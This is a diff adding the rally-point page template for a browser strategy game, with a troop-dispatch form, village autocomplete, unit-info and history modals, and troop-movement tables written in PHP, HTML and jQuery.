+                            <input type="text" id="place_destination_input" name="place_input" autocomplete="off" style="width: 100%; box-sizing: border-box; padding: 4px;">
+                            
+                             <!-- Hidden legacy input coordinates fields so backend and other modals work seamlessly -->
+                             <input type="hidden" name="x" id="x" value="<?= $prefill_x ?? $values['x'] ?? '' ?>">
+                             <input type="hidden" name="y" id="y" value="<?= $prefill_y ?? $values['y'] ?? '' ?>">
+
+                            <!-- Selected Village Card -->
+                            <div id="place_selected_village_card" style="display:none; align-items:center; border:1px solid #7d510f; background:#fcf6e4; padding:5px; box-sizing:border-box; margin-top:2px;">
+                                <img id="sel_village_img" src="/graphic/map/v1.png" style="width:38px; height:38px; margin-right:12px; object-fit:contain;" alt="">
+                                <div style="flex:1; font-size:11px; line-height:1.4; text-align:left; color:#000;">
+                                    <b id="sel_village_title"></b><br>
+                                    Proprietário: <span id="sel_village_owner"></span> Pontos: <span id="sel_village_points"></span><br>
+                                    Distância: <span id="sel_village_distance"></span> campos
+                                </div>
+                                <div style="display:flex; align-items:center; margin-left:10px;">
+                                    <a href="#" id="clear_selected_village" style="display:inline-block; width:20px; height:20px; line-height:20px; text-align:center; border:1px solid #7d510f; background:#e3d5b3; color:#a00; font-weight:bold; text-decoration:none; cursor:pointer; font-size:13px;" title="Limpar">X</a>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+            
+            <!-- Right Column: Links and Action buttons side by side -->
+            <td valign="middle" style="padding-left: 5px;">
+                <div style="display: inline-flex; align-items: center; gap: 15px;">
+                    <!-- Column 1 of links -->
+                    <div style="font-size: 11px; line-height: 1.5; white-space: nowrap;">
+                        <a href="#" id="btn-favoritos" style="font-weight: bold; color: #804000; text-decoration: none;"><?= __('screens.place.favorites') ?></a><br>
+                        <a href="#" id="btn-proprias" style="font-weight: bold; color: #804000; text-decoration: none; <?php if ($user['villages'] <= 1): ?>color: gray; cursor: not-allowed;<?php endif; ?>" <?php if ($user['villages'] <= 1): ?>title="<?= __('screens.place.must_have_2_villages') ?>"<?php endif; ?>><?= __('screens.place.own_villages') ?></a>
+                    </div>
+                    <!-- Column 2 of links -->
+                    <div style="font-size: 11px; line-height: 1.5; white-space: nowrap;">
+                        <a href="#" id="btn-historico" style="font-weight: bold; color: #804000; text-decoration: none;"><?= __('screens.place.history') ?></a><br>
+                        <a href="#" onclick="insertNumId('x',<?= $last_command['x'] ?>);insertNumId('y',<?= $last_command['y'] ?>); return false;" style="font-weight: bold; color: #804000; text-decoration: none;"><?= __('screens.place.previous') ?></a>
+                    </div>
+                    <!-- Action buttons -->
+                    <div style="display: inline-flex; gap: 8px; align-items: center;">
+                        <button class="btn btn-attack" name="attack" type="submit" style="">
+                            <?= __('screens.place.attack') ?>
+                        </button>
+                        <button class="btn btn-support" name="support" type="submit" style="">
+                            <?= __('screens.place.support') ?>
+                        </button>
+                    </div>
+                </div>
+            </td>
+        </tr>
+    </table>
+</form>
+
+<script type="text/javascript">
+    //<![CDATA[
+    // setImageTitles(); // TODO: Check if this function exists in global scope or needs helper
+
+    var popup_options = {
+        offset_x: 10,
+        offset_y: 10,
+        empty_errors: false
+    };
+
+    $(document).ready(function () {
+        if (typeof UI !== 'undefined' && UI.Draggable) {
+            UI.Draggable($('#inline_popup'));
+        }
+    });
+
+    // Vanilla JavaScript event listeners (don't depend on jQuery)
+    document.addEventListener('DOMContentLoaded', function () {
+        console.log('Place screen loaded, setting up popup buttons');
+
+        // Favoritos button
+        var btnFavoritos = document.getElementById('btn-favoritos');
+        if (btnFavoritos) {
+            btnFavoritos.addEventListener('click', function (e) {
+                e.preventDefault();
+                console.log('Favoritos clicked');
+                showBookmarksModal();
+                return false;
+            });
+        }
+
+        // Histórico button
+        var btnHistorico = document.getElementById('btn-historico');
+        if (btnHistorico) {
+            btnHistorico.addEventListener('click', function (e) {
+                e.preventDefault();
+                console.log('Histórico clicked');
+                showCommandHistoryModal();
+                return false;
+            });
+        }
+
+        // Próprias button
+        <?php if ($user['villages'] > 1): ?>
+            var btnProprias = document.getElementById('btn-proprias');
+            if (btnProprias) {
+                btnProprias.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    console.log('Próprias clicked');
+                    showVillagesModal();
+                    return false;
+                });
+            }
+        <?php endif; ?>
+
+        console.log('Popup buttons setup complete');
+
+        // Catapult target visibility logic
+        var catapultInput = document.querySelector('input[name="catapult"]');
+        var catapultTarget = document.getElementById('catapult_target_container');
+        if (catapultInput && catapultTarget) {
+            var updateCatapultVisibility = function () {
+                var count = parseInt(catapultInput.value) || 0;
+                catapultTarget.style.display = count > 0 ? 'block' : 'none';
+            };
+            catapultInput.addEventListener('input', updateCatapultVisibility);
+            catapultInput.addEventListener('change', updateCatapultVisibility);
+            // Run initially in case of pre-fill
+            updateCatapultVisibility();
+        }
+    });
+
+    function insertUnit(input, max) {
+        input.value = max;
+    }
+
+    function insertNumId(id, val) {
+        document.getElementById(id).value = val;
+    }
+
+    function selectCoiningNoneMax(text_all, text_none) {
+        var inputs = document.forms['kingsage'].getElementsByTagName('input');
+        var all_selected = true;
+
+        // Check if all are selected (max)
+        for (var i = 0; i < inputs.length; i++) {
+            if (inputs[i].type == 'text' && inputs[i].getAttribute('max_value')) {
+                if (inputs[i].value != inputs[i].getAttribute('max_value')) {
+                    all_selected = false;
+                    break;
+                }
+            }
+        }
+
+        for (var i = 0; i < inputs.length; i++) {
+            if (inputs[i].type == 'text' && inputs[i].getAttribute('max_value')) {
+                if (all_selected) {
+                    inputs[i].value = '';
+                } else {
+                    inputs[i].value = inputs[i].getAttribute('max_value');
+                }
+            }
+        }
+
+        var link = document.getElementById('select_all_1');
+        if (all_selected) {
+            link.innerHTML = text_all;
+        } else {
+            link.innerHTML = text_none;
+        }
+
+        // Update catapult target visibility after selecting all
+        updateCatapultTarget();
+    }
+
+    // Catapult Target Selector Logic
+    function updateCatapultTarget() {
+        var catapultInput = document.querySelector('input[name="unit_catapult"]');
+        var targetContainer = document.getElementById('catapult_target_container');
+
+        if (catapultInput && targetContainer) {
+            var catapultCount = parseInt(catapultInput.value) || 0;
+            targetContainer.style.display = (catapultCount > 0) ? 'block' : 'none';
+        }
+    }
+
+    // Setup catapult input listener
+    document.addEventListener('DOMContentLoaded', function () {
+        var catapultInput = document.querySelector('input[name="unit_catapult"]');
+        if (catapultInput) {
+            catapultInput.addEventListener('input', updateCatapultTarget);
+            catapultInput.addEventListener('change', updateCatapultTarget);
+            catapultInput.addEventListener('blur', updateCatapultTarget);
+            updateCatapultTarget(); // Initial check
+        }
+    });
+
+    // Override insertUnit to trigger catapult check
+    var originalInsertUnit = insertUnit;
+    function insertUnit(input, max) {
+        input.value = max;
+        updateCatapultTarget();
+    }
+
+    //]]>
+</script>
+
+<h3><?= __('screens.place.troop_movements') ?></h3>
+<?php if (count($my_movements) > 0): ?>
+    <table class="vis">
+        <tr>
+            <th width="250"><?= __('screens.place.own_orders') ?> (<?= count($my_movements) ?>)</th>
+            <th width="160"><?= __('screens.place.duration') ?></th>
+            <th width="80"><?= __('screens.place.arrival') ?></th>
+        </tr>
+        <?php foreach ($my_movements as $array): ?>
+            <tr>
+                <td>
+                    <a href="game.php?village=<?= $village['id'] ?>&screen=info_command&id=<?= $array['id'] ?>&type=own">
+                        <img src="/graphic/command/<?= $array['type'] ?>.png"> <?= $array['message'] ?>
+                    </a>
+                </td>
+                <td><?= $array['end_time'] ?></td>
+                <?php if ($array['arrival_in'] < 0): ?>
+                    <td><?= format_time($array['arrival_in']) ?></td>
+                <?php else: ?>
+                    <td><span class="timer"><?= format_time($array['arrival_in']) ?></span></td>
+                <?php endif; ?>
+                <?php if ($array['can_cancel']): ?>
+                    <td><a
+                            href="game.php?village=<?= $village['id'] ?>&screen=place&action=cancel&id=<?= $array['id'] ?>&h=<?= $hkey ?>"><?= __('screens.place.cancel') ?></a>
+                    </td>
+                <?php endif; ?>
+            </tr>
+        <?php endforeach; ?>
+    </table>
+    <br>
+<?php endif; ?>
+
+
+<?php if (count($other_movements) > 0): ?>
+    <table class="vis">
+        <tr>
+            <th width="250"><?= __('screens.place.next_army') ?> (<?= count($other_movements) ?>)</th>
+            <th width="160"><?= __('screens.place.duration') ?></th>
+            <th width="80"><?= __('screens.place.arrival') ?></th>
+        </tr>
+        <?php foreach ($other_movements as $array): ?>
+            <tr>
+                <td>
+                    <a href="game.php?village=<?= $village['id'] ?>&screen=info_command&id=<?= $array['id'] ?>&type=other">
+                        <img src="/graphic/command/<?= $array['type'] ?>.png"> <?= $array['message'] ?>
+                    </a>
+                </td>
+                <td><?= $array['end_time'] ?></td>
+                <?php if ($array['arrival_in'] < 0): ?>
+                    <td><?= format_time($array['arrival_in']) ?></td>
+                <?php else: ?>
+                    <td><span class="timer"><?= format_time($array['arrival_in']) ?></span></td>
+                <?php endif; ?>
+            </tr>
+        <?php endforeach; ?>
+    </table>
+<?php endif; ?>
+
+<!-- Unit Info Modal -->
+<div id="unit_info_modal"
+    style="display:none; position:fixed; z-index:9999; left:0; top:0; width:100%; height:100%; background-color:rgba(0,0,0,0.6);">
+    <div id="unit_modal_container"
+        style="background-color: #f7eed3; border: 2px solid #804000; width: 700px; margin: 100px auto; padding: 10px; position: relative; box-shadow: 0px 0px 15px #000; cursor: move;">
+        <div id="unit_modal_header"
+            style="background-color: #c1a264; padding: 5px; border: 1px solid #7d510f; color: #fff; font-weight: bold; margin-bottom: 10px; cursor: move;">
+            <span id="modal_unit_title"><?= __('screens.recruitment.unit') ?></span>
+            <span onclick="closeUnitModal()"
+                style="float: right; cursor: pointer; color: #5c0d0d; background: #e3d5b3; border: 1px solid #804000; padding: 0 5px;">X</span>
+        </div>
+        <div id="modal_unit_desc"
+            style="padding: 10px; font-style: italic; border-bottom: 1px solid #804000; margin-bottom: 10px;"></div>
+        <div id="modal_unit_content" style="padding: 10px; display: flex; gap: 20px;">
+            <div id="modal_unit_tables" style="flex-grow: 1;">
+                <table class="vis" width="100%">
+                    <tr>
+                        <th width="100"><?= __('screens.recruitment.cost') ?></th>
+                        <td id="modal_unit_cost"></td>
+                    </tr>
+                    <tr>
+                        <th><?= __('screens.recruitment.population') ?></th>
+                        <td id="modal_unit_pop"></td>
+                    </tr>
+                    <tr>
+                        <th><?= __('screens.recruitment.speed') ?></th>
+                        <td id="modal_unit_speed"></td>
+                    </tr>
+                    <tr>
+                        <th><?= __('screens.recruitment.carry_capacity') ?></th>
+                        <td id="modal_unit_booty"></td>
+                    </tr>
+                    <tr>
+                        <th><?= __('screens.recruitment.attack') ?></th>
+                        <td id="modal_unit_att"></td>
+                    </tr>
+                    <tr>
+                        <th><?= __('screens.recruitment.defense') ?></th>
+                        <td id="modal_unit_def"></td>
+                    </tr>
+                </table>
+
+                <div id="modal_unit_requirements" style="margin-top: 15px; display: none;">
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th colspan="2"><?= __('screens.recruitment.requirements') ?></th>
+                        </tr>
+                        <tbody id="modal_unit_req_body">
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            <div id="modal_unit_img_container" style="flex-shrink: 0;">
+                <img id="modal_unit_img" src="" alt="" />
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Command History Modal -->
+<div id="command_history_modal"
+    style="display:none; position:fixed; z-index:9999; left:0; top:0; width:100%; height:100%; background-color:rgba(0,0,0,0.6);">
+    <div id="history_modal_container"
+        style="background-color: #f7eed3; border: 2px solid #804000; width: 500px; margin: 100px auto; padding: 10px; position: relative; box-shadow: 0px 0px 15px #000;">
+        <div id="history_modal_header"
+            style="background-color: #c1a264; padding: 5px; border: 1px solid #7d510f; color: #fff; font-weight: bold; margin-bottom: 10px;">
+            <span><?= __('screens.place.attack_history') ?></span>
+            <span onclick="closeCommandHistoryModal()"
+                style="float: right; cursor: pointer; color: #5c0d0d; background: #e3d5b3; border: 1px solid #804000; padding: 0 5px;">X</span>
+        </div>
+        <div id="history_modal_content" style="padding: 10px; max-height: 400px; overflow-y: auto;">
+            <p style="text-align: center;"><?= __('screens.place.loading') ?></p>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+    // Unit definitions for modal
+    var unit_info = {
+        <?php
+        $u_infos = [];
+
+        // Define graphic mapping for exceptions
+        $graphic_map = [
+            'unit_cav_archer' => 'marcher_b',
+            'unit_mnich' => 'monge_b',
+        ];
+
+        // Iterate over ALL units, not just those the player has
+        foreach ($cl_units->get_array('dbname') as $u_db) {
+            // Get unit name
+            $u_name = $cl_units->get_name($u_db);
+
+            // Determine graphic name
+            if (isset($graphic_map[$u_db])) {
+                $graphic = $graphic_map[$u_db];
+            } else {
+                // Default pattern: remove 'unit_' prefix and add '_b'
+                $graphic = str_replace('unit_', '', $u_db) . '_b';
+            }
+
+            // Get requirements
+            $needed = $cl_units->get_needed($u_db);
+            $req_str = '[]';
+            if (count($needed) > 0) {
+                $req_arr = [];
+                foreach ($needed as $build => $level) {
+                    $buildName = $cl_builds->get_name($build);
+                    if (empty($buildName)) {
+                        // Fallback to translation key directly
+                        $buildName = __('buildings.' . $build . '.name');
+                    }
+                    $req_arr[] = "{building: '" . addslashes($buildName) . "', level: $level}";
+                }
+                $req_str = '[' . implode(',', $req_arr) . ']';
+            }
+
+            $u_infos[] = "'$u_db': {
+                name: '" . addslashes($u_name) . "',
+                desc: '" . addslashes($cl_units->get_description($u_db)) . "',
+                graphic: '" . addslashes($graphic) . "',
+                wood: " . $cl_units->get_woodprice($u_db) . ",
+                stone: " . $cl_units->get_stoneprice($u_db) . ",
+                iron: " . $cl_units->get_ironprice($u_db) . ",
+                pop: " . $cl_units->get_bhprice($u_db) . ",
+                speed: " . ($cl_units->get_speed($u_db) / 60) . ",
+                booty: " . $cl_units->get_booty($u_db) . ",
+                att: " . $cl_units->get_att($u_db, 1) . ",
+                def: " . $cl_units->get_def($u_db, 1) . ",
+                def_cav: " . $cl_units->get_defCav($u_db, 1) . ",
+                def_archer: " . $cl_units->get_defArcher($u_db, 1) . ",
+                requirements: $req_str
+            }";
+        }
+        // Properly join the array with comma and newline
+        echo implode(",\n        ", $u_infos);
+        ?>
+    };
+
+    function showUnitModal(unit) {
+        if (!unit_info[unit]) return;
+        var info = unit_info[unit];
+
+        document.getElementById('modal_unit_title').innerHTML = info.name;
+        document.getElementById('modal_unit_desc').innerHTML = info.desc;
+        document.getElementById('modal_unit_cost').innerHTML =
+            '<img src="/graphic/icons/wood.png" /> ' + info.wood + ' ' +
+            '<img src="/graphic/icons/stone.png" /> ' + info.stone + ' ' +
+            '<img src="/graphic/icons/iron.png" /> ' + info.iron;
+        document.getElementById('modal_unit_pop').innerHTML = '<img src="/graphic/icons/face.png" /> ' + info.pop;
+        document.getElementById('modal_unit_speed').innerHTML = info.speed + ' <?= __('screens.recruitment.min_per_field') ?>';
+        document.getElementById('modal_unit_booty').innerHTML = info.booty;
+        document.getElementById('modal_unit_att').innerHTML = '<img src="/graphic/unit/att.png" /> ' + info.att;
+        document.getElementById('modal_unit_def').innerHTML =
+            '<img src="/graphic/unit/def.png" /> ' + info.def + ' | ' +
+            '<img src="/graphic/unit/def_cav.png" /> ' + info.def_cav + ' | ' +
+            '<img src="/graphic/unit/def_archer.png" /> ' + info.def_archer;
+
+        // Use the graphic mapped in PHP
+        document.getElementById('modal_unit_img').src = '/graphic/unit_big/' + info.graphic + '.png';
+
+        // Requirements
+        var reqDiv = document.getElementById('modal_unit_requirements');
+        var reqBody = document.getElementById('modal_unit_req_body');
+        if (info.requirements.length > 0) {
+            reqBody.innerHTML = '';
+            info.requirements.forEach(function (req) {
+                reqBody.innerHTML += '<tr><td>' + req.building + '</td><td><?= __('screens.recruitment.level') ?> ' + req.level + '</td></tr>';
+            });
+            reqDiv.style.display = 'block';
+        } else {
+            reqDiv.style.display = 'none';
+        }
+
+        document.getElementById('unit_info_modal').style.display = 'block';
+    }
+
+    function closeUnitModal() {
+        document.getElementById('unit_info_modal').style.display = 'none';
+    }
+
+    // Close modal when clicking outside
+    document.getElementById('unit_info_modal').addEventListener('click', function (e) {
+        if (e.target.id === 'unit_info_modal') {
+            closeUnitModal();
+        }
+    });
+
+    // Make modal draggable
+    var modalContainer = document.getElementById('unit_modal_container');
+    var modalHeader = document.getElementById('unit_modal_header');
+    var isDragging = false;
+    var currentX, currentY, initialX, initialY;
+
+    modalHeader.addEventListener('mousedown', function (e) {
+        isDragging = true;
+        initialX = e.clientX - modalContainer.offsetLeft;
+        initialY = e.clientY - modalContainer.offsetTop;
+    });
+
+    document.addEventListener('mousemove', function (e) {
+        if (isDragging) {
+            e.preventDefault();
+            currentX = e.clientX - initialX;
+            currentY = e.clientY - initialY;
+            modalContainer.style.margin = '0';
+            modalContainer.style.left = currentX + 'px';
+            modalContainer.style.top = currentY + 'px';
+        }
+    });
+
+    document.addEventListener('mouseup', function () {
+        isDragging = false;
+    });
+
+    // Command History Modal Functions
+    function showCommandHistoryModal() {
+        var modal = document.getElementById('command_history_modal');
+        var content = document.getElementById('history_modal_content');
+
+        modal.style.display = 'block';
+        content.innerHTML = '<p style="text-align: center;"><?= addslashes(__('screens.place.loading')) ?></p>';
+
+        // Load history via AJAX
+        fetch('game.php?village=<?= $village['id'] ?>&screen=popup&mode=command_history')
+            .then(response => response.text())
+            .then(html => {
+                // Extract table content from response
+                var parser = new DOMParser();
+                var doc = parser.parseFromString(html, 'text/html');
+                var table = doc.querySelector('table');
+
+                if (table) {
+                    content.innerHTML = '';
+                    content.appendChild(table);
+
+                    // Add click handlers to links
+                    var links = content.querySelectorAll('a');
+                    links.forEach(function (link) {
+                        link.addEventListener('click', function (e) {
+                            e.preventDefault();
+                            var x = this.getAttribute('data-x') || this.textContent.match(/(\d+)\|(\d+)/)?.[1];
+                            var y = this.getAttribute('data-y') || this.textContent.match(/(\d+)\|(\d+)/)?.[2];
+
+                            if (x && y) {
+                                document.getElementById('x').value = x;
+                                document.getElementById('y').value = y;
+                                closeCommandHistoryModal();
+                            }
+                        });
+                    });
+                } else {
+                    content.innerHTML = '<p style="text-align: center; color: #999;"><?= addslashes(__('screens.place.no_history')) ?></p>';
+                }
+            })
+            .catch(error => {
+                console.error('Error loading history:', error);
+                content.innerHTML = '<p style="text-align: center; color: red;"><?= addslashes(__('screens.place.error_loading_history')) ?></p>';
+            });
+    }
+
+    function closeCommandHistoryModal() {
+        document.getElementById('command_history_modal').style.display = 'none';
+    }
+
+    function showBookmarksModal() {
+        var modal = document.getElementById('command_history_modal');
+        var content = document.getElementById('history_modal_content');
+        var headerTitle = document.querySelector('#history_modal_header span:first-child');
+
+        headerTitle.textContent = '<?= addslashes(__('screens.place.favorites')) ?>';
+        modal.style.display = 'block';
+        content.innerHTML = '<p style="text-align: center;"><?= addslashes(__('screens.place.loading')) ?></p>';
+
+        fetch('game.php?village=<?= $village['id'] ?>&screen=popup&mode=bookmark')
+            .then(response => response.text())
+            .then(html => {
+                var parser = new DOMParser();
+                var doc = parser.parseFromString(html, 'text/html');
+                var table = doc.querySelector('table');
+                if (table) {
+                    content.innerHTML = '';
+                    content.appendChild(table);
+                    addCoordinateClickHandlers(content);
+
+                    // Add AJAX deletion support for favorite items inside the modal
+                    var delLinks = content.querySelectorAll('.del-favorite-link');
+                    delLinks.forEach(function (delLink) {
+                        delLink.addEventListener('click', function (e) {
+                            e.preventDefault();
+                            if (confirm('<?= addslashes(__('screens.place.confirm_remove_favorite')) ?>')) {
+                                var url = this.getAttribute('href');
+                                fetch(url)
+                                    .then(() => {
+                                        showBookmarksModal();
+                                    })
+                                    .catch(err => console.error('Error deleting favorite:', err));
+                            }
+                        });
+                    });
+                } else {
+                    content.innerHTML = '<p style="text-align: center; color: #999;"><?= addslashes(__('screens.place.no_favorites')) ?></p>';
+                }
+            });
+    }
+
+    function showVillagesModal() {
+        var modal = document.getElementById('command_history_modal');
+        var content = document.getElementById('history_modal_content');
+        var headerTitle = document.querySelector('#history_modal_header span:first-child');
+
+        headerTitle.textContent = '<?= addslashes(__('screens.place.own_villages')) ?>';
+        modal.style.display = 'block';
+        content.innerHTML = '<p style="text-align: center;"><?= addslashes(__('screens.place.loading')) ?></p>';
+
+        fetch('game.php?village=<?= $village['id'] ?>&screen=popup&mode=villages')
+            .then(response => response.text())
+            .then(html => {
+                var parser = new DOMParser();
+                var doc = parser.parseFromString(html, 'text/html');
+                var table = doc.querySelector('table');
+                if (table) {
+                    content.innerHTML = '';
+                    content.appendChild(table);
+                    addCoordinateClickHandlers(content);
+                } else {
+                    content.innerHTML = '<p style="text-align: center; color: #999;"><?= addslashes(__('screens.place.no_villages')) ?></p>';
+                }
+            });
+    }
+
+    function addCoordinateClickHandlers(container) {
+        var links = container.querySelectorAll('a:not(.del-favorite-link)');
+        console.log('addCoordinateClickHandlers: Found ' + links.length + ' links');
+        
+        links.forEach(function (link) {
+            link.addEventListener('click', function (e) {
+                e.preventDefault();
+                console.log('Link clicked:', this);
+                
+                // Try to extract from onclick attribute first (popup views use this)
+                var onclick = this.getAttribute('onclick');
+                console.log('onclick attribute:', onclick);
+                var x, y;
+                
+                if (onclick) {
+                    // Extract from insertNumId('x','123');insertNumId('y','456')
+                    var xMatch = onclick.match(/insertNumId\('x',\s*'(\d+)'\)/);
+                    var yMatch = onclick.match(/insertNumId\('y',\s*'(\d+)'\)/);
+                    console.log('xMatch:', xMatch, 'yMatch:', yMatch);
+                    if (xMatch && yMatch) {
+                        x = xMatch[1];
+                        y = yMatch[1];
+                    }
+                }
+                
+                // Fallback: try to extract from link text (format: 123|456)
+                if (!x || !y) {
+                    var text = this.textContent;
+                    console.log('Trying text extraction from:', text);
+                    var match = text.match(/(\d+)\|(\d+)/);
+                    console.log('text match:', match);
+                    if (match) {
+                        x = match[1];
+                        y = match[2];
+                    }
+                }
+                
+                console.log('Final coordinates - x:', x, 'y:', y);
+                
+                if (x && y) {
+                    console.log('Setting coordinates...');
+                    document.getElementById('x').value = x;
+                    document.getElementById('y').value = y;
+                    console.log('Coordinates set, closing modal');
+                    closeCommandHistoryModal();
+                } else {
+                    console.error('Could not extract coordinates!');
+                }
+            });
+        });
+    }
+
+    // Close modal when clicking outside
+    document.getElementById('command_history_modal').addEventListener('click', function (e) {
+        if (e.target.id === 'command_history_modal') {
+            closeCommandHistoryModal();
+        }
+    });
+
+    $(document).ready(function() {
+        const input = $('#place_destination_input');
+        
+        // Append autocomplete dropdown container to body to avoid container clipping
+        if ($('#place_autocomplete_dropdown').length === 0) {
+            $('body').append('<div id="place_autocomplete_dropdown"></div>');
+        }
+        const dropdown = $('#place_autocomplete_dropdown');
+        let ajaxTimeout = null;
+
+        function repositionDropdown() {
+            if (dropdown.is(':visible')) {
+                let offset = input.offset();
+                dropdown.css({
+                    top: offset.top + 'px',
+                    left: offset.left + 'px',
+                    width: input.outerWidth() + 'px'
+                });
+            }
+        }
+
+        $(window).on('scroll resize', repositionDropdown);
+
+        function showSelectedVillageCard(item) {
+            if (!item) return;
+
+            let pts = parseInt(item.points) || 0;
+            let graphic = 'v1';
+            if (pts >= 11000) graphic = 'v6';
+            else if (pts >= 9000) graphic = 'v5';
+            else if (pts >= 3000) graphic = 'v4';
+            else if (pts >= 1000) graphic = 'v3';
+            else if (pts >= 300) graphic = 'v2';
+
+            $('#sel_village_img').attr('src', '/graphic/map/' + graphic + '.png');
+            $('#sel_village_title').text(item.name + ' (' + item.x + '|' + item.y + ')');
+            $('#sel_village_owner').text(item.owner || 'Aldeia bárbara');
+            $('#sel_village_points').text(pts.toLocaleString('pt-PT'));
+            $('#sel_village_distance').text(item.distance);
+
+            // Force target type to coordinates since we have exact coordinates now
+            $('#tt_coords').prop('checked', true);
+
+            input.hide();
+            $('#place_selected_village_card').css('display', 'flex');
+            dropdown.hide().empty();
+        }
+
+        let lastValue = '';
+        let currentAjax = null;
+
+        function checkCoordinates(val) {
+            let match = val.match(/^(\d{1,3})\|(\d{1,3})$/);
+            if (match) {
+                let x = match[1];
+                let y = match[2];
+
+                if (currentAjax) currentAjax.abort();
+
+                currentAjax = $.ajax({
+                    url: 'game.php',
+                    type: 'GET',
+                    data: {
+                        screen: 'api',
+                        type: 'village_by_coords',
+                        x: x,
+                        y: y
+                    },
+                    dataType: 'json',
+                    success: function(data) {
+                        if (data) {
+                            showSelectedVillageCard(data);
+                        } else {
+                            $('#place_selected_village_card').hide();
+                            input.show();
+                        }
+                    }
+                });
+            } else {
+                $('#place_selected_village_card').hide();
+                input.show();
+            }
+        }
+
+        // Run interval to detect coordinate changes (including manual typing, load, and clicking legacy modals/links)
+        setInterval(function() {
+            // Check the values of hidden inputs #x and #y
+            let xVal = $('#x').val().trim();
+            let yVal = $('#y').val().trim();
+            let val = '';
+            if (xVal !== '' && yVal !== '') {
+                val = xVal + '|' + yVal;
+            }
+            if (val !== lastValue) {
+                lastValue = val;
+                if (val !== '') {
+                    input.val(val);
+                    checkCoordinates(val);
+                } else {
+                    input.val('');
+                    $('#place_selected_village_card').hide();
+                    input.show();
+                }
+            }
+        }, 200);
+
+        input.on('input focus', function() {
+            let q = $(this).val().trim();
+            let targetType = $('input[name="target_type"]:checked').val();
+
+            if (q.length < 2 || targetType === 'coords') {
+                dropdown.hide().empty();
+                return;
+            }
+
+            clearTimeout(ajaxTimeout);
+            ajaxTimeout = setTimeout(function() {
+                let apiType = targetType === 'village_name' ? 'autocomplete_village' : 'autocomplete_player';
+                $.ajax({
+                    url: 'game.php',
+                    type: 'GET',
+                    data: {
+                        screen: 'api',
+                        type: apiType,
+                        q: q
+                    },
+                    dataType: 'json',
+                    success: function(data) {
+                        dropdown.empty();
+                        if (!data || data.length === 0) {
+                            // Reposition before showing
+                            let offset = input.offset();
+                            dropdown.css({
+                                top: offset.top + 'px',
+                                left: offset.left + 'px',
+                                width: input.outerWidth() + 'px'
+                            }).html('<div style="padding:10px; text-align:center; font-style:italic; font-size:11px; color:#555; background:#f4e4bc;">Nenhuma aldeia encontrada</div>').show();
+                            return;
+                        }
+
+                        data.forEach(function(item, idx) {
+                            let pts = parseInt(item.points) || 0;
+                            let graphic = 'v1';
+                            if (pts >= 11000) graphic = 'v6';
+                            else if (pts >= 9000) graphic = 'v5';
+                            else if (pts >= 3000) graphic = 'v4';
+                            else if (pts >= 1000) graphic = 'v3';
+                            else if (pts >= 300) graphic = 'v2';
+
+                            let displayStyle = idx >= 10 ? 'style="display:none;" class="autocomplete-item hidden-item"' : 'class="autocomplete-item"';
+
+                            let row = $(`
+                                <div ${displayStyle} data-x="${item.x}" data-y="${item.y}">
+                                    <img src="/graphic/map/${graphic}.png" alt="">
+                                    <div class="autocomplete-details">
+                                        <b>${item.name} (${item.x}|${item.y})</b><br>
+                                        Proprietário: ${item.owner} Pontos: ${pts.toLocaleString('pt-PT')}<br>
+                                        Distância: ${item.distance} campos
+                                    </div>
+                                </div>
+                            `);
+                            row.data('item', item);
+                            dropdown.append(row);
+                        });
+
+                        if (data.length > 10) {
+                            dropdown.append(`
+                                <div id="show_more_autocomplete" style="padding:8px; text-align:center; font-weight:bold; cursor:pointer; background:#e3d5b3; border-top:1px solid #7d510f; color:#000; font-size:11px;">
+                                    Mostrar mais
+                                </div>
+                            `);
+                        }
+
+                        // Position and show
+                        let offset = input.offset();
+                        dropdown.css({
+                            top: offset.top + 'px',
+                            left: offset.left + 'px',
+                            width: input.outerWidth() + 'px'
+                        }).show();
+                    }
+                });
+            }, 150);
+        });
+
+        // Handle selection click from dropdown
+        dropdown.on('click', '.autocomplete-item', function() {
+            let x = $(this).data('x');
+            let y = $(this).data('y');
+            let item = $(this).data('item');
+
+            $('#x').val(x);
+            $('#y').val(y);
+            input.val(x + '|' + y);
+            lastValue = x + '|' + y;
+
+            $('#tt_coords').prop('checked', true);
+            dropdown.hide().empty();
+            
+            showSelectedVillageCard(item);
+        });
+
+        // Handle clearing the selected village
+        $('#clear_selected_village').on('click', function(e) {
+            e.preventDefault();
+            $('#x').val('');
+            $('#y').val('');
+            input.val('');
+            lastValue = '';
+            $('#place_selected_village_card').hide();
+            input.show().focus();
+        });
+
+        // Handle "Mostrar mais" click
+        dropdown.on('click', '#show_more_autocomplete', function() {
+            $(this).remove();
+            dropdown.find('.hidden-item').removeClass('hidden-item').show();
+            repositionDropdown(); // Adjust height calculations if container grows
+        });
+
+        // Hide on click outside
+        $(document).on('click', function(e) {
+            if (!$(e.target).closest('#place_destination_input, #place_autocomplete_dropdown').length) {
+                dropdown.hide();
+            }
+        });
+
+        // Handle target type change
+        $('input[name="target_type"]').on('change', function() {
+            dropdown.hide().empty();
+            if ($(this).val() !== 'coords') {
+                input.trigger('input');
+            }
+        });
+
+        // Also handle manual coordinates typed directly in place_destination_input
+        input.on('input', function() {
+            let val = $(this).val().trim();
+            let match = val.match(/^(\d{1,3})\|(\d{1,3})$/);
+            if (match) {
+                $('#x').val(match[1]);
+                $('#y').val(match[2]);
+            }
+        });
+    });
+</script>
